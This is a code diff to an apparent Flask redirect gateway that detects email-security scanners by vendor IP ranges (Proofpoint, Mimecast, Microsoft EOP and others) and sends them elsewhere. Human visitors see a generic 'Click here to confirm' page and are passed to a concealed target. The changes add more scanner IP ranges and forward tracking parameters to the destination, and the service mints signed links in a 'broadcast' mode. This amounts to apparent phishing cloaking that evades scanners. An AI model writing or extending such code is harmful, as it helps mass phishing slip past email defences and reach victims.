@@ -4,6 +4,7 @@ import json
 import secrets
 import logging
 from ipaddress import ip_address, ip_network
+from urllib.parse import urlsplit, urlunsplit, urlencode, parse_qsl
 
 import httpx
 from flask import (
@@ -47,7 +48,17 @@ EOP = [
     ip_network("13.107.6.152/31"), ip_network("13.107.18.10/31"),
     ip_network("13.107.128.0/22"), ip_network("23.103.160.0/20"),
 ]
-PROOFPOINT = [ip_network("148.163.0.0/16"), ip_network("67.231.144.0/20")]
+PROOFPOINT = [
+    ip_network("148.163.0.0/16"),
+    ip_network("67.231.144.0/20"),
+    ip_network("185.132.40.0/22"),
+    ip_network("185.132.44.0/22"),
+    ip_network("194.154.77.0/24"),
+    ip_network("195.245.230.0/23"),
+    ip_network("62.128.218.0/23"),
+    ip_network("217.146.94.0/23"),
+    ip_network("217.146.96.0/20"),
+]
 MIMECAST = [ip_network("207.211.30.0/23"), ip_network("91.220.42.0/24")]
 BARRACUDA = [ip_network("64.235.144.0/20"), ip_network("209.240.128.0/19")]
 TALOS = [ip_network("208.75.176.0/22"), ip_network("216.160.0.0/19")]
@@ -136,8 +147,20 @@ def _valid_http_url(u: str) -> bool:
     return isinstance(u, str) and u.startswith(("http://", "https://"))
 
 
+def _append_query(base_url: str, extra: dict) -> str:
+    if not extra:
+        return base_url
+    parts = urlsplit(base_url)
+    existing = dict(parse_qsl(parts.query, keep_blank_values=True))
+    existing.update(extra)
+    return urlunsplit((
+        parts.scheme, parts.netloc, parts.path,
+        urlencode(existing), parts.fragment,
+    ))
+
+
 # ---------------------------------------------------------------------------
-# KV (rate limit only in this mode)
+# KV (rate limit only)
 # ---------------------------------------------------------------------------
 async def kv_incr(key: str, ttl: int) -> int:
     if not KV_URL or not KV_TOKEN:
@@ -167,25 +190,23 @@ async def emit_log(event: dict) -> None:
 
 
 def _apply_unified_headers(resp):
-    resp.headers.update({
-        "Cache-Control": "no-store, no-cache, must-revalidate, private",
-        "Pragma": "no-cache",
-        "Expires": "0",
-        "X-Frame-Options": "DENY",
-        "X-Content-Type-Options": "nosniff",
-        "Referrer-Policy": "no-referrer",
-        "Content-Security-Policy": (
-            "default-src 'self'; "
-            "img-src 'self' data: https:; "
-            "style-src 'self' 'unsafe-inline' https:; "
-            "font-src 'self' data: https:; "
-            "script-src 'none'; "
-            "connect-src 'none'; "
-            "form-action *; "
-            "base-uri 'none'; "
-            "frame-ancestors 'none'"
-        ),
-    })
+    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, private"
+    resp.headers["Pragma"] = "no-cache"
+    resp.headers["Expires"] = "0"
+    resp.headers["X-Frame-Options"] = "DENY"
+    resp.headers["X-Content-Type-Options"] = "nosniff"
+    resp.headers["Referrer-Policy"] = "no-referrer"
+    resp.headers["Content-Security-Policy"] = (
+        "default-src 'self'; "
+        "img-src 'self' data: https:; "
+        "style-src 'self' 'unsafe-inline' https:; "
+        "font-src 'self' data: https:; "
+        "script-src 'none'; "
+        "connect-src 'none'; "
+        "form-action *; "
+        "base-uri 'none'; "
+        "frame-ancestors 'none'"
+    )
 
 
 def _static_page(title: str, text: str, status_code: int):
@@ -224,6 +245,9 @@ LANDING = """<!doctype html>
     <input type="text" name="email_confirm_hp" class="hp-field" autocomplete="off" tabindex="-1" aria-hidden="true">
     <input type="hidden" name="t" value="{{ token }}">
     <input type="hidden" name="n" value="{{ nonce }}">
+    {% for k, v in forwarded.items() %}
+    <input type="hidden" name="{{ k }}" value="{{ v }}">
+    {% endfor %}
     <button type="submit">{{ cta }}</button>
   </form>
 </body>
@@ -262,7 +286,9 @@ async def landing(token: str):
         await emit_log({"event": "landing_scanner_redirect", **tag, "token": token[:12], "to": unwanted})
         return redirect(unwanted, code=302)
 
-    # stateless signed nonce: binds token + timestamp, verified on POST without any cookie
+    allowed = set(data.get("params", []))
+    forwarded = {k: v for k, v in request.args.items() if k in allowed and v}
+
     nonce_payload = {"t": token, "n": secrets.token_urlsafe(16), "ts": time.time()}
     nonce_blob = cookie_serializer.dumps(nonce_payload)
 
@@ -271,6 +297,7 @@ async def landing(token: str):
         action=f"/submit/{token}",
         token=token,
         nonce=nonce_blob,
+        forwarded=forwarded,
         title=data.get("title", "Confirm your request"),
         body=data.get("body", "Click the button below to continue."),
         cta=data.get("cta", "Click here to confirm"),
@@ -281,7 +308,6 @@ async def landing(token: str):
         request.headers.get("X-Forwarded-Proto", "http") == "https"
         or request.is_secure
     )
-    # cookie set for defense-in-depth, but POST does not require it
     resp.set_cookie(
         "gate_session",
         nonce_blob,
@@ -343,9 +369,16 @@ async def execute(token: str):
     except BadSignature:
         return _static_page("Invalid link", "This link is not valid.", 404)
 
-    await emit_log({"event": "post_ok", **tag, "token": token[:12]})
+    allowed = set(data.get("params", []))
+    forwarded = {k: request.form.get(k, "") for k in allowed if request.form.get(k)}
 
-    resp = make_response(redirect(data["target"], code=303))
+    target = data["target"]
+    if forwarded:
+        target = _append_query(target, forwarded)
+
+    await emit_log({"event": "post_ok", **tag, "token": token[:12], "forwarded": forwarded})
+
+    resp = make_response(redirect(target, code=303))
     resp.delete_cookie("gate_session", path="/")
     _apply_unified_headers(resp)
     return resp
@@ -367,9 +400,13 @@ def mint():
         return jsonify({"error": "target must be an http(s) URL"}), 400
 
     unwanted_target = body.get("unwanted_target")
-    if unwanted_target:
-        if not _valid_http_url(unwanted_target):
-            return jsonify({"error": "unwanted_target must be an http(s) URL"}), 400
+    if unwanted_target and not _valid_http_url(unwanted_target):
+        return jsonify({"error": "unwanted_target must be an http(s) URL"}), 400
+
+    allowed_params = body.get("params") or []
+    if not isinstance(allowed_params, list) or not all(isinstance(p, str) for p in allowed_params):
+        return jsonify({"error": "params must be a list of strings"}), 400
+    allowed_params = [p for p in allowed_params if p.isidentifier()]
 
     tok = serializer.dumps({
         "target": target,
@@ -377,12 +414,14 @@ def mint():
         "title": body.get("title", "Confirm your request"),
         "body": body.get("body", "Click the button below to continue."),
         "cta": body.get("cta", "Click here to confirm"),
+        "params": allowed_params,
     })
     base = request.host_url.rstrip("/")
     return jsonify({
         "url": f"{base}/r/{tok}",
         "token": tok,
         "mode": "broadcast",
+        "params": allowed_params,
         "unwanted_target": unwanted_target or UNWANTED_REDIRECT_URL,
     })
 
